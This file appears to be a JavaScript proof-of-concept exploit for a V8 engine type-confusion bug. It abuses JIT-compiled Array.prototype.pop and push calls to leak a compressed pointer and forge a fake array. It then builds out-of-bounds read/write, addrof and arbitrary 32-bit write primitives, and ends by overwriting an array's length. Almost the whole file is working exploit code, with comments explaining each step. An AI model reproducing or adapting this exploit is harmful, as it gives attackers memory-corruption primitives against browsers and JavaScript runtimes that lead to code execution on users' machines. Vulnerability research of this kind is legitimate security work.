let buf = new ArrayBuffer(8);
let f64 = new Float64Array(buf);
let f32 = new Float32Array(buf);
let u32 = new Uint32Array(buf);
let u64 = new BigUint64Array(buf);

function itof(i) {
  u32[0] = i;
  return f32[0];
}

async function sleep(ms = 50) {
  await new Promise((r) => setTimeout(r, ms));
}

function f64toi64(f) {
  f64[0] = f;
  return u64[0];
}

function i64tof64(i) {
  u64[0] = i;
  return f64[0];
}

function i32tof64(lo, hi) {
  u32[0] = lo;
  u32[1] = hi;
  return f64[0];
}

// mark and sweep
function gc_major() {
  new ArrayBuffer(0x7FE00000);
}

// mark scavenge
function gc_minor() {
  for(let i = 0; i < 1000; i++) {
    new ArrayBuffer(0x10000);
  }
}

BigInt.prototype.hex = function () {
  return "0x" + this.toString(16);
};

Number.prototype.hex = function () {
  return "0x" + this.toString(16);
};

let leak_double = [1.1, 2.2];
let confused_array = new Array(1);
let fake_object_addr = 0;
let leak_compressed = 0;
let new_leak_double_elem_offset = 0x1e8;
// release version
let new_leak_double_map = 0x10e4a1;

function trigger(trigger) {
  function leak_obj(v2, v3) {
    var v4 = v3[0];
    var v5 = v2[0];
    return Array.prototype.pop.call(v3);
  }
  function push_fake_object(v2, v3) {
    var v4 = v3[0];
    var v5 = v2[0];
    Array.prototype.push.call(v3, fake_object_addr);
  }
  const holey1 = new Array(1);
  holey1[0] = 'tagged';
  const holey2 = new Array(1);
  holey2[0] = 'tagged';
  leak_obj(holey1, [1]);
  leak_obj(holey1, [1]);
  push_fake_object(holey2, [1]);
  push_fake_object(holey2, [1]);
  
  confused_array[0] = 1.1;
  
  for (let i = 0; i < 0x10000; i++) {
    leak_obj(holey1, [1]);
    push_fake_object(holey2, [1]);
  }
  
  if (trigger) {
    gc_major();
    gc_minor();
    // leak the address of the first element (1.1) in leak_double
    // this is because leak_double is incorrectly treated as a FixedArray
    // which contains pointers to objects rather than the literal object values
    // and so when Array.prototype.pop is called on the confused array the address
    // to 3.3 and the properties address are returned as a 64bit float rather than
    // literal values
    let leak = leak_obj(leak_double, leak_double);
    // extract the address to 1.1 from the 64bit float
    leak_compressed = Number(f64toi64(leak) & 0xFFFFFFFFn);
    // calculate the address where the fake object floats are in new leak_double
    // using new_leak_double_elem_offset, this offset should be pretty stable
    // due to the gc that is forced just prior to the leak and the subsequent
    // allocation of new leak_double below
    fake_object_addr = i32tof64(0, leak_compressed+new_leak_double_elem_offset+8);
    // place address to the fake object into the confused_array array
    // such that the floats in new leak_double are treated as an array
    // with a length of 0x100 which provides an initial adjacent OOB r/w
    // primitive
    push_fake_object(confused_array, confused_array);
  } else {
    leak_obj(leak_double, leak_double);
    push_fake_object(confused_array, confused_array);
  }
}

trigger(false);
trigger(true);

console.log("[+] leak_double[0] addr: ", leak_compressed.hex());
console.log("[+] new leak_double elements pointer: ", (leak_compressed+new_leak_double_elem_offset).hex());

// new leak_double
leak_double = [
  // map and properties
  i32tof64(new_leak_double_map, 0x745),
  // elem and length
  i32tof64(leak_compressed+new_leak_double_elem_offset, 0x100)
];

confused_array.length = 6;
let fake_arr = confused_array[5];

// used to debug the offset of the leak_compressed pointer relative to leak_double's elements pointer
//%DebugPrint(leak_double)

// used to establish addrof and caged arb r/w primitives
var obj_arr = [{}, 1.1, 2.2, 3.3, 4.4];
var float_arr = [1.1, 2.2, 3.3, 4.4];

// debug to find where the above objects are adjacent to fake_arr
//for (let i = 0; i < 60; i++) {
//  console.log(i, f64toi64(fake_arr[i]).hex());
//}
//%DebugPrint(obj_arr);
//%DebugPrint(float_arr);
let obj_arr_elem_index = 11;
let float_arr_elem_index = 18;
let obj_elem = f64toi64(fake_arr[obj_arr_elem_index]) >> 32n;
let float_elem = f64toi64(fake_arr[float_arr_elem_index]) >> 32n;

console.log("[+] obj_arr elem: ", obj_elem.hex());
console.log("[+] float_arr elem: ", float_elem.hex());


function addrof(in_obj) {
  let restore = fake_arr[float_arr_elem_index];

  obj_arr[0] = in_obj;
  
  // change the upper 32 bits of restore which contains float_arr's elements pointer
  let new_value = (obj_elem << 32n) | (f64toi64(restore) & 0xFFFFFFFFn);
  
  // change float_arr's elements pointer to obj_arr's elements pointer
  fake_arr[float_arr_elem_index] = i64tof64(new_value);

  // leak the address of in_obj
  let addr = float_arr[0];

  // return the lower 32 bits which is in_obj's compressed pointer
  return Number(f64toi64(addr) & 0xFFFFFFFFn);
}

function write32(addr, value) {
  let restore = fake_arr[float_arr_elem_index];
  let new_elem = (BigInt(addr)-8n << 32n) | (f64toi64(restore) & 0xFFFFFFFFn);
  
  fake_arr[float_arr_elem_index] = i64tof64(new_elem);
  
  let new_value = (f64toi64(float_arr[0]) & 0xFFFFFFFF00000000n) | (BigInt(value) & 0xFFFFFFFFn);
  
  float_arr[0] = i64tof64(new_value);
}

let test = [1.2,2.2];
// change the length of test to 1337
write32(addrof(test)+12, 1337n);
alert();